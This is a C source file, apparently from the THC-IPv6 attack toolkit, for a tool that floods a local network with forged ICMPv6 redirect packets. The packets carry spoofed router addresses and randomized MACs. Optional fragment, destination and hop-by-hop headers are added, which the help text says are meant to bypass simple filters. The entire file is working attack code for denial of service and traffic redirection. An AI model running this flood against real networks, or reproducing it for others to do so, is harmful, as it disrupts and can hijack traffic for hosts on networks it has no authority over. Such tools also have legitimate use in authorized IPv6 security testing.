#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2022 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-HFD] interface [target] [oldrouter [newrouter]]\n\n",
         prg);
  printf("Flood the local network with ICMPv6 redirect packets.\n");
  printf(
      "-F/-D/-H add fragment/destination/hopbyhop header to bypass simple "
      "filters\n");
  printf("-a adds hopbyhop with router alert\n");
  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *         interface, mac[6] = "", newroutermac[6];
  unsigned char *mac6 = mac;
  unsigned char  buf[1460], buf2[6], buf3[1504];
  unsigned char *dst = thc_resolve6("ff02::1"), *fake_src = NULL,
                *fake_dst = NULL, *dstmac = NULL, *oldrouter = NULL,
                *newrouter = NULL;
  int            i, j, k, type = NXT_ICMP6, offset = 14, rand_newrouter = 1;
  unsigned char *pkt = NULL, *pkt2 = NULL;
  int pkt_len = 0, pkt_len2 = 0, rawmode = 0, count = 0, do_alert = 0,
      do_hop = 0, do_frag = 0, do_dst = 0;
  int           until = 0;
  thc_ipv6_hdr *hdr = NULL, *hdr2 = NULL;

  if (argc < 2 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  while ((i = getopt(argc, argv, "aDFH")) >= 0) {
    switch (i) {
      case 'F':
        do_frag++;
        break;
      case 'H':
        do_hop = 1;
        break;
      case 'a':
        do_alert = 1;
        do_hop = 1;
        break;
      case 'D':
        do_dst = 1;
        break;
      default:
        fprintf(stderr, "Error: invalid option %c\n", i);
        exit(-1);
    }
  }

  if (argc - optind < 1) help(argv[0]);

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);

  interface = argv[optind];
  if (argc - optind > 1) {
    dst = thc_resolve6(argv[optind + 1]);
    fake_src = dst;
  } else
    fake_src = thc_resolve6("fe80::");
  dstmac = thc_get_multicast_mac(dst);
  if (argc - optind > 2) {
    oldrouter = thc_resolve6(argv[optind + 2]);
    if ((mac6 = thc_get_mac(interface, NULL, dst)) == NULL)
      mac6 = thc_get_own_mac(interface);
  } else {
    if (dst[0] >= 0x20 && dst[0] <= 0xfd)
      oldrouter = thc_get_own_ipv6(interface, dst, PREFER_GLOBAL);
    else
      oldrouter = thc_get_own_ipv6(interface, dst, PREFER_LINK);
    mac6 = thc_get_own_mac(interface);
  }
  if (mac6 == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }
  if (argc - optind > 3) {
    newrouter = thc_resolve6(argv[optind + 2]);
    rand_newrouter = 0;
  } else
    newrouter = thc_resolve6("fe80::2");
  fake_dst = thc_resolve6("2004::1");
  memset(newroutermac, 0, 6);

  if ((pkt2 = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len2,
                                       fake_src, fake_dst, 0, 0, 0, 0, 0)) ==
      NULL)
    return -1;
  if (thc_add_icmp6(pkt2, &pkt_len2, ICMP6_PING, 0, 0, NULL, 0, 0) < 0)
    return -1;
  thc_generate_pkt(interface, mac6, dstmac, pkt2, &pkt_len2);
  hdr = (thc_ipv6_hdr *)pkt2;

  k = rand();
  newroutermac[1] = 2;
  memcpy(newroutermac + 2, (char *)&k + _TAKE4, 4);
  k++;

  if (do_hdr_size) offset = do_hdr_size;

  memset(buf2, 0, sizeof(buf2));
  memset(buf3, 0, sizeof(buf3));
  memset(buf, 0, sizeof(buf));

  j = 0;
  buf[j++] = 0;  // etc.
  memcpy(buf, newrouter, 16);
  memcpy(buf + 16, fake_dst, 16);
  buf[32] = 2;
  buf[33] = 1;
  memcpy(buf + 34, newroutermac, 6);
  buf[40] = 4;
  buf[41] = (hdr->pkt_len - offset + 8) / 8;
  memcpy(buf + 48, hdr->pkt + offset, (buf[41] - 1) * 8);
  j = 40 + buf[41] * 8;

  if (do_alert) {
    buf2[0] = 5;
    buf2[1] = 2;
  }

  printf(
      "Starting to flood with ICMPv6 redirects on %s (Press Control-C to end, "
      "a dot is printed for every 1000 packets):\n",
      interface);
  while (until != 1) {
    if (rand_newrouter) memcpy(buf + 8, (char *)&k + _TAKE4, 4);  // new router
    memcpy(buf + 16 + 2, (char *)&k + _TAKE4, 4);                 // orig dst
    memcpy(buf + 34 + 2, (char *)&k + _TAKE4, 4);  // new router mac
    k++;
    count++;
    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len,
                                        oldrouter, dst, 255, 0, 0, 0, 0)) ==
        NULL)
      return -1;
    if (do_hop) {
      type = NXT_HBH;
      if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, sizeof(buf2)) < 0)
        return -1;
    }
    if (do_frag) {
      if (type == NXT_ICMP6) type = NXT_FRAG;
      for (i = 0; i < do_frag; i++)
        if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, count + i) < 0)
          return -1;
    }
    if (do_dst) {
      if (type == NXT_ICMP6) type = NXT_DST;
      if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0) return -1;
    }

    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_REDIR, 0, 0, buf, j, 0) < 0)
      return -1;

    if (do_dst) {
      thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len);
      hdr2 = (thc_ipv6_hdr *)pkt;
      thc_send_as_fragment6(interface, oldrouter, dst, type,
                            hdr2->pkt + 40 + offset,
                            hdr2->pkt_len - 40 - offset, 1240);
    } else {
      if (thc_generate_and_send_pkt(interface, mac6, dstmac, pkt, &pkt_len) <
          0) {
        printf("!");
      }
    }

    pkt = thc_destroy_packet(pkt);
    //    usleep(1);
    if (count % 1000 == 0) printf(".");
    if (until > 1) until--;
  }

  return 0;
}
